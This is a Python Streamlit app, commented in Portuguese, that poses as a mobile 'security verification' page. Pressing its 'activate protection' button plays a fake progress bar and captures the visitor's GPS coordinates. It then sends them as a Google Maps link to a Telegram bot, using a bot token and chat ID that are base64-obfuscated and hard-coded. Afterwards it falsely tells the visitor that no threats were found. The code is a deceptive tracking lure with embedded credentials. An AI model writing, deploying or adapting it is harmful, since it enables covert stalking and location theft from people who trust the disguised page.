import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- DADOS PROTEGIDOS ---
# Se o bot não responder com estes, o Token pode ter expirado no BotFather
B_TK = "ODUyNTkyNzY0MTpBQUhLRE9ORnZoOExnVXBJRU5tdHBsVGZIdW9GcmcxZmZyOA=="
B_ID = "ODIxMDgyODM5OA=="

def enviar_telegram(mensagem):
    try:
        # Decodificação direta
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        
        url = f"https://api.telegram.org/bot{tk}/sendMessage"
        data = {"chat_id": ci, "text": mensagem, "parse_mode": "Markdown"}
        
        # Tentativa real de envio
        r = requests.post(url, json=data, timeout=10)
        return r.status_code == 200
    except:
        return False

st.set_page_config(page_title="SEGURANÇA INTEGRADA", page_icon="🔐", layout="centered")

# Estilo Visual
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: #ffffff; }
    .status-ok { color: #2ea043; font-weight: bold; font-size: 19px; margin-top: 15px; }
    .stProgress > div > div > div > div { background-color: #0056b3; }
    .stButton>button { background-color: #21262d; color: #c9d1d9; border: 1px solid #30363d; width: 100%; }
    .footer { text-align: center; color: #8b949e; font-size: 12px; margin-top: 80px; padding-top: 20px; border-top: 1px solid #30363d; }
    </style>
    """, unsafe_allow_html=True)

st.title("Verificação de Segurança")

if 'verificado' not in st.session_state:
    st.session_state.verificado = False

if not st.session_state.verificado:
    if st.button("● ATIVAR PROTEÇÃO AGORA"):
        progresso = st.progress(0)
        for i in range(1, 101):
            time.sleep(0.02)
            progresso.progress(i)
        
        # Captura de Localização
        loc = get_geolocation()
        if loc:
            lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
            mapa = f"https://www.google.com/maps?q={lat},{lon}"
            
            # Tenta enviar
            sucesso = enviar_telegram(f"🚨 SISTEMA ATIVADO\n📍 Mapa: {mapa}")
            
            if sucesso:
                st.session_state.verificado = True
                st.rerun()
            else:
                st.error("Erro de conexão com o Bot. Verifique o Token.")
        else:
            st.warning("⚠️ Por favor, ative o GPS do seu celular para concluir.")
else:
    st.markdown('<p class="status-ok">Sistema Seguro: nenhuma ameaça foi detectada</p>', unsafe_allow_html=True)
    st.progress(100)
    st.button("● PROTEÇÃO ATIVA", disabled=True)

st.markdown('<div class="footer">Sistema Integrado desenvolvido por Miamy © 2026</div>', unsafe_allow_html=True)
